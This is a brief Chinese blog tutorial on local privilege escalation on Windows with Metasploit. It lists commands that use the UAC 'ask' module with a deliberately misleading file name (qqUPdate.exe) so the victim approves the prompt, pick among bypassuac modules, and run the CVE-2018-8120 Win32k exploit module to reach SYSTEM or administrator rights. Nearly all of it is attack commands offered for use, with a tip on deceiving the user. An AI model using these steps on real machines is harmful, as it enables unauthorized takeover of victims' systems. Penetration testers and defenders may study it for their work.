[同文博客园链接](https://www.cnblogs.com/caihon/p/13957604.html)

##  **msf本地提权**

### 1\. 利用uac提权

前提与目标机建立会话连接

  1. seach local/ask 搜索关键字local/ask 
  2. use 0 进入到exploit/windows/local/ask模块下
  3. show options 查看相关参数
  4. set FILENAME qqUPdate.exe 设置文件名qqUPdate.exe（具有迷惑性的名字都可以）
  5. set session 1 设置会话窗口（先查看一下会话的id）
  6. run执行[![wps79](https://image.3001.net/images/20201116/1605504471.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105827435-1055728008.jpg)
  7. 目标机弹出弹窗
  8. 点击是后，成功进入meterpreter命令行
  9. 这时候getsystem就可以成功提权

### 2\. 绕过uac认证

  1. search bypassuac 搜索bypassuac关键字（显示有13个提取脚本，一个不行就换一个）[![wps83](https://image.3001.net/images/20201116/1605504471.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105830116-985681861.jpg)
  2. use 3 进入编号为3的提权脚本模块
  3. show opthions 查看相关参数
  4. 查看会话并且设置会话
  5. show targets 显示可选平台
  6. set target 0 设置为X86
  7. run 执行
  8. 提权成功

### 3\. 利用windows本地提权漏洞进行提权

  1. cve-2018-8120 Win32k权限提升漏洞]，影响范围(Windows 7 SP1/2008 SP2,2008 R2 SP1)
  2. search cve-2018-8120 查找关键字
  3. use 0 进入该模块
  4. show options 查看相关参数
  5. session 查看会话
  6. 设置为没有权限的会话3
  7. 进入后直接获得管理员权限

  

  

  

  

